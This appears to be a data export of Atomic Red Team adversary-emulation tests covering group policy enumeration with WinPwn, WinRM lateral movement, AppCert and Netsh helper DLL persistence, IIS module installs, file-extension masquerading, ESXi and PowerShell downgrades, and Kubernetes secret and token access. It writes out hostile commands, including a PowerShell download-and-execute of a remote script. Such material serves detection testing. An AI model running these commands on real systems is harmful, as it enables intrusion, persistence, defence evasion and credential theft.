nodes.description: Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn

nodes.name: Command for WinPwn - GPOAudit
nodes.description: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput

nodes.name: WinPwn - GPORemoteAccessPolicy
nodes.description: Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn

nodes.name: Command for WinPwn - GPORemoteAccessPolicy
nodes.description: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPORemoteAccessPolicy -consoleoutput -noninteractive

nodes.name: MSFT Get-GPO Cmdlet
nodes.description: The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps

nodes.name: Command for MSFT Get-GPO Cmdlet
nodes.description: Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}

nodes.name: Cleanup for MSFT Get-GPO Cmdlet
nodes.description: del $env:temp\GPO_Output.txt -erroraction silentlycontinue

nodes.name: Remote Services: Windows Remote Management
nodes.description: Atomic Red Team technique: Remote Services: Windows Remote Management

nodes.name: Enable Windows Remote Management
nodes.description: Powershell Enable WinRM Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.

nodes.name: Command for Enable Windows Remote Management
nodes.description: Enable-PSRemoting -Force

nodes.name: Remote Code Execution with PS Credentials Using Invoke-Command
nodes.description: Simulate lateral movement with PowerShell Remoting on the local host. Upon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the local machine as remote target.

nodes.name: Command for Remote Code Execution with PS Credentials Using Invoke-Command
nodes.description: Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}

nodes.name: Cleanup for Remote Code Execution with PS Credentials Using Invoke-Command
nodes.description: Disable-PSRemoting -Force

nodes.name: WinRM Access with Evil-WinRM
nodes.description: An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled

nodes.name: Command for WinRM Access with Evil-WinRM
nodes.description: evil-winrm -i #{destination_address} -u #{user_name} -p #{password}

nodes.name: Gather Victim Host Information: Hardware
nodes.description: Atomic Red Team technique: Gather Victim Host Information: Hardware

nodes.name: Enumerate PlugNPlay Camera
nodes.description: Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor

nodes.name: Command for Enumerate PlugNPlay Camera
nodes.description: Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"

nodes.name: Build Image on Host
nodes.description: Atomic Red Team technique: Build Image on Host

nodes.name: Build Image On Host
nodes.description: Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.

nodes.name: Command for Build Image On Host
nodes.description: docker build -t t1612 $PathtoAtomicsFolder/T1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh

nodes.name: Cleanup for Build Image On Host
nodes.description: docker stop t1612_container docker rmi -f t1612

nodes.name: Event Triggered Execution: AppCert DLLs
nodes.description: Atomic Red Team technique: Event Triggered Execution: AppCert DLLs

nodes.name: Create registry persistence via AppCert DLL
nodes.description: Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. Once the computer restarted, the DLL will be loaded in multiple processes and write an 'AtomicTest.txt' file in C:\Users\Public\ to validate that the DLL executed succesfully. Reference: https://skanthak.homepage.t-online.de/appcert.html

nodes.name: Command for Create registry persistence via AppCert DLL
nodes.description: Copy-Item "#{dll_path}" C:\Users\Public\AtomicTest.dll -Force reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll" /f if(#{reboot}){Restart-Computer}

nodes.name: Cleanup for Create registry persistence via AppCert DLL
nodes.description: reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /f Remove-Item C:\Users\Public\AtomicTest.dll -Force Remove-Item C:\Users\Public\AtomicTest.txt -Force

nodes.name: IIS Components
nodes.description: Atomic Red Team technique: IIS Components

nodes.name: Install IIS Module using AppCmd.exe
nodes.description: The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed. This atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/). A successful execution will install a module into IIS using AppCmd.exe. [Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe) [IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)

nodes.name: Command for Install IIS Module using AppCmd.exe
nodes.description: %windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}

nodes.name: Cleanup for Install IIS Module using AppCmd.exe
nodes.description: %windir%\system32\inetsrv\appcmd.exe uninstall module #{module_name}

nodes.name: Install IIS Module using PowerShell Cmdlet New-WebGlobalModule
nodes.description: The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed. This atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/). A successful execution will install a module into IIS using New-WebGlobalModule. [Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps) [IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)

nodes.name: Command for Install IIS Module using PowerShell Cmdlet New-WebGlobalModule
nodes.description: New-WebGlobalModule -Name #{module_name} -Image #{dll_path}

nodes.name: Cleanup for Install IIS Module using PowerShell Cmdlet New-WebGlobalModule
nodes.description: Remove-WebGlobalModule -Name #{module_name}

nodes.name: Masquerading: Double File Extension
nodes.description: Atomic Red Team technique: Masquerading: Double File Extension

nodes.name: File Extension Masquerading
nodes.description: download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched. e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)

nodes.name: Command for File Extension Masquerading
nodes.description: copy "#{exe_path}" %temp%\T1036.007_masquerading.docx.exe /Y copy "#{exe_path}" %temp%\T1036.007_masquerading.pdf.exe /Y copy "#{exe_path}" %temp%\T1036.007_masquerading.ps1.exe /Y copy "#{vbs_path}" %temp%\T1036.007_masquerading.xls.vbs /Y copy "#{vbs_path}" %temp%\T1036.007_masquerading.xlsx.vbs /Y copy "#{vbs_path}" %temp%\T1036.007_masquerading.png.vbs /Y copy "#{ps1_path}" %temp%\T1036.007_masquerading.doc.ps1 /Y copy "#{ps1_path}" %temp%\T1036.007_masquerading.pdf.ps1 /Y copy "#{ps1_path}" %temp%\T1036.007_masquerading.rtf.ps1 /Y %temp%\T1036.007_masquerading.docx.exe %temp%\T1036.007_masquerading.pdf.exe %temp%\T1036.007_masquerading.ps1.exe %temp%\T1036.007_masquerading.xls.vbs %temp%\T1036.007_masquerading.xlsx.vbs %temp%\T1036.007_masquerading.png.vbs C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1

nodes.name: Cleanup for File Extension Masquerading
nodes.description: del /f %temp%\T1036.007_masquerading.docx.exe > nul 2>&1 del /f %temp%\T1036.007_masquerading.pdf.exe > nul 2>&1 del /f %temp%\T1036.007_masquerading.ps1.exe > nul 2>&1 del /f %temp%\T1036.007_masquerading.xls.vbs > nul 2>&1 del /f %temp%\T1036.007_masquerading.xlsx.vbs > nul 2>&1 del /f %temp%\T1036.007_masquerading.png.vbs > nul 2>&1 del /f %temp%\T1036.007_masquerading.doc.ps1 > nul 2>&1 del /f %temp%\T1036.007_masquerading.pdf.ps1 > nul 2>&1 del /f %temp%\T1036.007_masquerading.rtf.ps1 > nul 2>&1

nodes.name: Software Deployment Tools
nodes.description: Atomic Red Team technique: Software Deployment Tools

nodes.name: Radmin Viewer Utility
nodes.description: An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.

nodes.name: Command for Radmin Viewer Utility
nodes.description: "%PROGRAMFILES(x86)%/#{radmin_exe}"

nodes.name: PDQ Deploy RAT
nodes.description: An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.

nodes.name: Command for PDQ Deploy RAT
nodes.description: "%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}"

nodes.name: Deploy 7-Zip Using Chocolatey
nodes.description: An adversary may use Chocolatey to remotely deploy the 7-Zip file archiver utility.

nodes.name: Command for Deploy 7-Zip Using Chocolatey
nodes.description: # Deploy 7-Zip using Chocolatey choco install -y 7zip

nodes.name: Impair Defenses: Downgrade Attack
nodes.description: Atomic Red Team technique: Impair Defenses: Downgrade Attack

nodes.name: ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
nodes.description: An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host. [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)

nodes.name: Command for ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
nodes.description: Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass} (Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = "CommunitySupported"}) Disconnect-VIServer -Confirm:$false

nodes.name: ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI
nodes.description: An adversary will change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria via ESXCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host. [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)

nodes.name: Command for ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI
nodes.description: echo "" | "#{plink_file}" "#{vm_host}" -ssh -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"

nodes.name: PowerShell Version 2 Downgrade
nodes.description: Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.

nodes.name: Command for PowerShell Version 2 Downgrade
nodes.description: PowerShell -version 2 -command '#{v2_command}'

nodes.name: Kubernetes List Secrets
nodes.description: Atomic Red Team technique: Kubernetes List Secrets

nodes.name: List All Secrets
nodes.description: A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster. [More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/). This test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.

nodes.name: Command for List All Secrets
nodes.description: kubectl get secrets --all-namespaces

nodes.name: ListSecrets
nodes.description: A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.

nodes.name: Command for ListSecrets
nodes.description: kubectl get secrets -n #{namespace}

nodes.name: Cat the contents of a Kubernetes service account token file
nodes.description: Access the Kubernetes service account access token stored within a container in a cluster.

nodes.name: Command for Cat the contents of a Kubernetes service account token file
nodes.description: kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token

nodes.name: Cleanup for Cat the contents of a Kubernetes service account token file
nodes.description: kubectl --context kind-atomic-cluster delete pod atomic-pod

nodes.name: Event Triggered Execution: Netsh Helper DLL
nodes.description: Atomic Red Team technique: Event Triggered Execution: Netsh Helper DLL

nodes.name: Netsh Helper DLL Registration
nodes.description: You can register a "helper dll" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called. The NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run. [Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html) [Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)

nodes.name: Command for Netsh Helper DLL Registration
nodes.description: netsh.exe add helper "#{helper_file}" taskkill /im notepad.exe /t /f > NUL 2>&1

nodes.name: Cleanup for Netsh Helper DLL Registration
nodes.description: netsh.exe delete helper "#{helper_file}"
